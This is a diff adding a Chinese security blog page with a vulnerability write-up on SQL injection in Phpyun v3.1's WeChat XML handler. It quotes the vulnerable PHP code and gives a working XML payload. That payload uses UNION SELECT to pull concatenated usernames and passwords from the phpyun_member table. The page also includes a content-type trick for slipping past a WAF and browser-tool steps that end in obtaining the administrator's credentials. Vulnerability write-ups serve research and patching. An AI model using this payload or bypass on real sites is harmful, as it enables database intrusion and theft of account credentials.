@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Phpyun v3.1 xml 注入漏洞一、漏洞简介函数过滤不严谨，用户POST过去的内容没有进行任何过滤，导致攻击者可以利用XML实体进行注入，从而获取数据库敏感信息 二、漏洞影响3.1 build14061 三、复现过程漏洞分析本次漏洞文件位于 weixin&#x2F;model&#x2F;index.class.php ，代码如下： private function responseMsg() { $postS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/PhpYun/Phpyun%20v3.1%20xml%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Phpyun v3.1 xml 注入漏洞一、漏洞简介函数过滤不严谨，用户POST过去的内容没有进行任何过滤，导致攻击者可以利用XML实体进行注入，从而获取数据库敏感信息 二、漏洞影响3.1 build14061 三、复现过程漏洞分析本次漏洞文件位于 weixin&#x2F;model&#x2F;index.class.php ，代码如下： private function responseMsg() { $postS">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.gif">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId30.gif">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId31.gif">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId32.gif">
+<meta property="article:published_time" content="2022-07-08T06:26:02.401Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.404Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.gif">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-PhpYun/Phpyun v3.1 xml 注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/PhpYun/Phpyun%20v3.1%20xml%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:02.401Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpyun-v3-1-xml-注入漏洞"><a href="#Phpyun-v3-1-xml-注入漏洞" class="headerlink" title="Phpyun v3.1 xml 注入漏洞"></a>Phpyun v3.1 xml 注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>函数过滤不严谨，用户POST过去的内容没有进行任何过滤，导致攻击者可以利用XML实体进行注入，从而获取数据库敏感信息</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>3.1 build14061</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>本次漏洞文件位于 <code>weixin/model/index.class.php</code> ，代码如下：</p>
+<p>private function responseMsg() { $postStr =<br>$GLOBALS[&quot;HTTP_RAW_POST_DATA&quot;];</p>
+<pre><code>if (!empty($postStr))&#123;
+
+             $postObj = simplexml_load_string($postStr, &#39;SimpleXMLElement&#39;, LIBXML_NOCDATA);
+              $fromUsername = $postObj-&gt;FromUserName;
+              $toUsername = $postObj-&gt;ToUserName;
+              $keyword = trim($postObj-&gt;Content);
+              $time = time();
+              $textTpl = &quot;&lt;xml&gt;
+     &lt;![CDATA[%s]]&gt;
+     &lt;![CDATA[%s]]&gt;
+     %s
+     &lt;![CDATA[%s]]&gt;
+     &lt;![CDATA[%s]]&gt;
+     0
+     &lt;/xml&gt;&quot;;
+  if(!empty( $keyword ))
+              &#123;
+              $msgType = &quot;text&quot;;
+               $contentStr = &quot;Welcome to wechat world!&quot;;
+               $resultStr = sprintf($textTpl, $fromUsername, $toUsername, $time, $msgType, $contentStr);
+               echo $resultStr;
+              &#125;else&#123;
+               echo &quot;Input something...&quot;;
+              &#125;
+
+      &#125;else &#123;
+       echo &quot;&quot;;
+       exit;
+      &#125;
+  &#125;
+</code></pre>
+<p>这里将$postStr = $GLOBALS[&quot;HTTP_RAW_POST_DATA&quot;]，通过<br>simplexml_load_string解析后的内容，将其直接带入了$textTpl。</p>
+<p>然而$postStr = $GLOBALS[&quot;HTTP_RAW_POST_DATA&quot;]<br>，直接获取了POST过来的XML内容，没有经过任何处理，并在最后将其输出。<br>if($MsgType==&#39;event&#39;) { $MsgEvent = $postObj-&gt;Event; if<br>($MsgEvent==&#39;subscribe&#39;) { $centerStr =<br>&quot;&lt;![CDATA[欢迎您关注&quot;.iconv(&#39;gbk&#39;,&#39;utf-8&#39;,$this-&gt;config[&#39;sy_webname&#39;]).&quot;！/n<br>1：您可以直接回复关键字如【销售】、【南京 销售】、【南京 销售<br>XX公司】查找您想要的职位/n绑定您的账户体验更多精彩功能/n感谢您的关注！]]&gt;&quot;;<br>$this-&gt;MsgType = &#39;text&#39;;</p>
+<pre><code>  &#125;elseif ($MsgEvent==&#39;CLICK&#39;)
+  &#123;
+   $EventKey = $postObj-&gt;EventKey;
+   if($EventKey==&#39;我的帐号&#39;)&#123;
+    $centerStr = $this-&gt;bindUser($fromUsername);
+
+   &#125;elseif($EventKey==&#39;我的消息&#39;)
+   &#123;
+    $centerStr = $this-&gt;myMsg($fromUsername);
+   &#125;elseif($EventKey==&#39;面试邀请&#39;)
+   &#123;
+    $centerStr = $this-&gt;Audition($fromUsername);
+
+   &#125;elseif($EventKey==&#39;简历查看&#39;)
+   &#123;
+
+    $centerStr = $this-&gt;lookResume($fromUsername);
+
+   &#125;elseif($EventKey==&#39;刷新简历&#39;)
+   &#123;
+
+    $centerStr = $this-&gt;refResume($fromUsername);
+</code></pre>
+<p>从上述代码可以看出来，当满足那上面的条件后都会进入不同的相应的函数，但是都会进入一个名为<code>isBind</code>函数。</p>
+<p>接下来追踪isBind函数：</p>
+<p>private function isBind($wxid=&#39;&#39;) {</p>
+<pre><code>if($wxid)
+&#123;
+ $User = $this-&gt;obj-&gt;DB_select_once(&quot;member&quot;,&quot;`wxid`=&#39;&quot;.$wxid.&quot;&#39;&quot;,&quot;`uid`,`username`&quot;);
+&#125;
+if($User[&#39;uid&#39;]&gt;0)
+&#123;
+ $User[&#39;bindtype&#39;] = &#39;1&#39;;
+ $User[&#39;cenetrTpl&#39;] = &quot;&lt;![CDATA[您的&quot;.iconv(&#39;gbk&#39;,&#39;utf-8&#39;,$this-&gt;config[&#39;sy_webname&#39;]).&quot;帐号：&quot;.$User[&#39;username&#39;].&quot;已成功绑定！ /n/n/n 您也可以config[&#39;sy_weburl&#39;].&quot;/wap/index.php?m=login&amp;wxid=&quot;.$wxid.&quot;/&quot;&gt;点击这里进行解绑或绑定其他帐号]]&gt;&quot;;
+
+&#125;else&#123;
+
+ $Token = $this-&gt;getToken();
+ $Url = &#39;https://api.weixin.qq.com/cgi-bin/user/info?access_token=&#39;.$Token.&#39;&amp;openid=&#39;.$wxid.&#39;&amp;lang=zh_CN&#39;;
+ $CurlReturn  = $this-&gt;CurlPost($Url);
+ $UserInfo    = json_decode($CurlReturn);
+
+ $wxid        = $wxid;
+ $wxname      = $UserInfo-&gt;nickname;
+ $this-&gt;config[&#39;token_time&#39;] = time();
+
+ $User[&#39;cenetrTpl&#39;] = &#39;&lt;![CDATA[您还没有绑定帐号，config[&#39;sy_weburl&#39;].&#39;/wap/index.php?m=login&amp;wxid=&#39;.$wxid.&#39;&quot;&gt;点击这里进行绑定!]]&gt;&#39;;
+&#125;
+
+return $User;
+
+&#125;
+</code></pre>
+<p>可以看到，从始至终wxid变量始终没有经过任何过滤，在第一行的<code>$wxid</code>就是我们传进来的FromUserName的值，可以直接进入SQL语句，进行任意注入。</p>
+<p>因此我们可以针对其构造Payload，内容如下：</p>
+<p>一般来说，我们只需要将Payload以POST形式的数据发出去，就可以成功的获取数据库敏感信息，但是服务器如果有WAF，提交的恶意数据必然会被拦截，因此，我们需要修改HTTP头，伪装成XML就可以不受到WAF的拦截：</p>
+<pre><code>Content-type:text/xml;charset=utf-8
+</code></pre>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>我们首先打开目标站点，点击网页左侧注册按钮，首先注册一个账号：</p>
+<p><img src="/resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.gif"></p>
+<p>这个时候已经是登录状态，我们按<code>F9</code> 调出 <code>Hack Bar</code><br>的界面，点击<code>Enable Post data</code> ，将Payload写入输入框，如下图所示：</p>
+<p><img src="/resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<h4 id="payload文件"><a href="#payload文件" class="headerlink" title="payload文件:"></a>payload文件:</h4><h5 id="注-payload文件内容需手动输入相应位置"><a href="#注-payload文件内容需手动输入相应位置" class="headerlink" title="注:payload文件内容需手动输入相应位置"></a>注:payload文件内容需手动输入相应位置</h5><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+  &lt;xml&gt;
+    1111
+    1111&#39; and 1=2 union select 1,(select concat(username,password) from phpyun_member limit 0,1)#
+    1402550611
+    event
+    CLICK
+    我的账号
+    0
+  &lt;/xml&gt;
+</code></pre>
+<p>接下来还需要修改HTTP头，伪装成XML，点击浏览器上方工具栏，打开<code>Tamper Data</code><br>，点击启动。</p>
+<p><img src="/resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId30.gif"></p>
+<p>现在前提工作已经做好，接下来重新访问网站，Tamper Data<br>就会抓取到数据包，再对数据包进行更改，操作如图：</p>
+<p><img src="/resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId31.gif"></p>
+<p>然后点击确定就可以将构造好的数据包发出去：</p>
+<p><img src="/resource/Phpyunv3.1xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId32.gif"></p>
+<p>成功获取管理员账号密码。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whatiwhere/article/details/84862236">https://blog.csdn.net/whatiwhere/article/details/84862236</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/PhpYun/Phpyun%20v3.1%20xml%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qupx00euy8v154ws6bz5" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/PhpYun/Phpyun%20v4.2%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89%204.3%204.5%20%E7%B3%BB%E7%BB%9F%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Phpweb/Phpweb%20%E5%89%8D%E5%8F%B0getshell/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
